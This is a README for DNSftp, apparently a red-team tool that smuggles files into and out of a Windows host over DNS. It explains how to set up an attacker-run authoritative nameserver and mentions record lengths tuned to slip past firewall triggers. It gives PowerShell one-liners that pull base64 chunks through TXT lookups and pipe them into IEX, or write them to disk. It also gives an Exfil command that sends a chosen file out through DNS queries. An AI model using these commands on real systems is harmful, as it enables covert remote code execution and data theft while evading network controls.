# DNSftp
Ever found yourself in a position that you have access to system but can't copy files over, copy files from and in general your live is miserable but you do actually have DNS out of bound? DNSftp is a tool to help exfiltrate/infiltrate files over DNS or even run powershell snippets directly, all over DNS. The script has been tested with python 2.

## How it works
The server either cuts a file into base64 pieces and serves it as the response to a TXT request in the case of infiltration. In the case of exfiltration the server reassembles base64 pieces that come in as a request for a subdomain. Moreover, base64 piece length has been adjusted because certain firewalls have triggers for response lengths of 100 characters in TXT records. 

## What do I need
For the server to work, you have to have an authoritative a domain of your own, let's assume `mydomain.com`. Then, you need a subdomain `ns1` that will act as the authoritative dns for another subdomain `dnsops`. The configuration looks like the following:

|Host   |Record Type |Value              |
|-------|------------|-------------------|
|dnsops |NS Record   |ns1.mydomain.com   |
|ns1    |A Record    |123.123.123.123    |

After the above configuration is complete on your domain provider's nameservers, you simply have to run the script on `ns1` host and let it act as the DNS server. (Obviously you have to leave port 53 UDP accessible over the internet).

```
python DNSftp.py -f filetohost.ext
```

Hosting a directory is still an experiment so go with -f and specify the file you want to host. Then all you have to do is go the windows host and type the following in a powershell command prompt. 

Note that `qqq` in the commands below has to be changed between file operations in order to bypass caching. 

* ### Infiltration case1
If you want to directly run a powershell file hosted by the server (date.ps1 provided as a quick test):

```
For($x=0;$x -ge 0;$x++){$y=Resolve-DnsName "$x.qqq.infil.dnsops.mydomain.com" -Type TXT|Select -ExpandProperty Strings;If($y -eq "EOF"){break}$z+=$y}[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($z))|IEX
```

* ### Infiltration case2 
If you want to download the file locally on the windows system:
```
For($x=0;$x -ge 0;$x++){$y=Resolve-DnsName "$x.qqq.infil.dnsops.mydomain.com" -Type TXT|Select -ExpandProperty Strings;If($y -eq "EOF"){break}$z+=$y}[System.Convert]::FromBase64String($z)|Set-Content -Encoding Byte .\date.ps1
```

* ### Exfiltration case 
If you want to exfiltrate a file over DNS, there is nothing that needs to be changed on the server, however, you have to import the included `exfil.ps1` on your host (by using the methods above to transfer it) and then: 
```
Exfil C:\folder\folder\file.extension
```

I hope this proves to be helpful for you as it has been for me. I do know the code is quick and dirty but oh well, what can you do. Usually time of the essence and I just can't be bothered with making it look good. Use at your own risk, can't stress that enough! xD